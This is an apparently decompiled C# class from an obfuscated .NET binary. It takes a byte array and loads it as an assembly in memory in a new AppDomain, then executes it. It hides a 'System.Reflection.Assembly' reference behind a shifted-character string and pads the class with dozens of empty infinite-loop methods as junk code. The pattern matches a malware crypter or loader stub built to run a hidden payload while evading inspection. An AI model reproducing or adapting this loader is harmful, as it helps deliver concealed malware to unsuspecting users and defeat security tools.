using System;
using System.Reflection;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class GClass6 : MarshalByRefObject
{
	private static object object_0;

	public static Assembly smethod_0(object sender, ResolveEventArgs args)
	{
		return AppDomain.CurrentDomain.Load((byte[])object_0);
	}

	public static bool smethod_1(byte[] byte_0)
	{
		object_0 = byte_0;
		if (smethod_2())
		{
			return true;
		}
		return false;
	}

	private static bool smethod_2()
	{
		Thread thread = new Thread(smethod_3);
		thread.Start();
		return true;
	}

	public static void smethod_3()
	{
		AppDomain appDomain = AppDomain.CreateDomain("艾艾贝提248ÄÏねせろうDBGq5もれなめ");
		_ = (GClass6)appDomain.CreateInstanceAndUnwrap(typeof(GClass6).Assembly.FullName, typeof(GClass6).FullName);
		byte[] byte_ = (byte[])object_0;
		if (smethod_4(ref byte_))
		{
			AppDomain.Unload(appDomain);
		}
		else
		{
			AppDomain.Unload(appDomain);
		}
	}

	public static bool smethod_4(ref byte[] byte_0)
	{
		AppDomain.CurrentDomain.AssemblyResolve += smethod_0;
		object_0 = byte_0;
		try
		{
			AppDomain.CurrentDomain.ExecuteAssemblyByName(GForm0.smethod_3("--", 2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public static object smethod_5()
	{
		GForm0.GDelegate0 gDelegate = GForm0.smethod_3;
		return GClass7.wajak(Type.GetType(gDelegate("W}wxiq2Vijpigxmsr2Ewwiqfp}", 4)));
	}

	private void method_0()
	{
		while (true)
		{
		}
	}

	private void method_1()
	{
		while (true)
		{
		}
	}

	private void method_2()
	{
		while (true)
		{
		}
	}

	private void method_3()
	{
		while (true)
		{
		}
	}

	private void method_4()
	{
		while (true)
		{
		}
	}

	private void method_5()
	{
		while (true)
		{
		}
	}

	private void method_6()
	{
		while (true)
		{
		}
	}

	private void method_7()
	{
		while (true)
		{
		}
	}

	private void method_8()
	{
		while (true)
		{
		}
	}

	private void method_9()
	{
		while (true)
		{
		}
	}

	private void method_10()
	{
		while (true)
		{
		}
	}

	private void method_11()
	{
		while (true)
		{
		}
	}

	private void method_12()
	{
		while (true)
		{
		}
	}

	private void method_13()
	{
		while (true)
		{
		}
	}

	private void method_14()
	{
		while (true)
		{
		}
	}

	private void method_15()
	{
		while (true)
		{
		}
	}

	private void method_16()
	{
		while (true)
		{
		}
	}

	private void method_17()
	{
		while (true)
		{
		}
	}

	private void method_18()
	{
		while (true)
		{
		}
	}

	private void method_19()
	{
		while (true)
		{
		}
	}

	private void method_20()
	{
		while (true)
		{
		}
	}

	private void method_21()
	{
		while (true)
		{
		}
	}

	private void method_22()
	{
		while (true)
		{
		}
	}

	private void method_23()
	{
		while (true)
		{
		}
	}

	private void method_24()
	{
		while (true)
		{
		}
	}

	private void method_25()
	{
		while (true)
		{
		}
	}

	private void method_26()
	{
		while (true)
		{
		}
	}

	private void method_27()
	{
		while (true)
		{
		}
	}

	private void method_28()
	{
		while (true)
		{
		}
	}

	private void method_29()
	{
		while (true)
		{
		}
	}

	private void method_30()
	{
		while (true)
		{
		}
	}

	private void method_31()
	{
		while (true)
		{
		}
	}

	private void method_32()
	{
		while (true)
		{
		}
	}

	private void method_33()
	{
		while (true)
		{
		}
	}

	private void method_34()
	{
		while (true)
		{
		}
	}

	private void method_35()
	{
		while (true)
		{
		}
	}

	private void method_36()
	{
		while (true)
		{
		}
	}

	private void method_37()
	{
		while (true)
		{
		}
	}

	private void method_38()
	{
		while (true)
		{
		}
	}

	private void method_39()
	{
		while (true)
		{
		}
	}

	private void method_40()
	{
		while (true)
		{
		}
	}

	private void method_41()
	{
		while (true)
		{
		}
	}

	private void method_42()
	{
		while (true)
		{
		}
	}

	private void method_43()
	{
		while (true)
		{
		}
	}
}
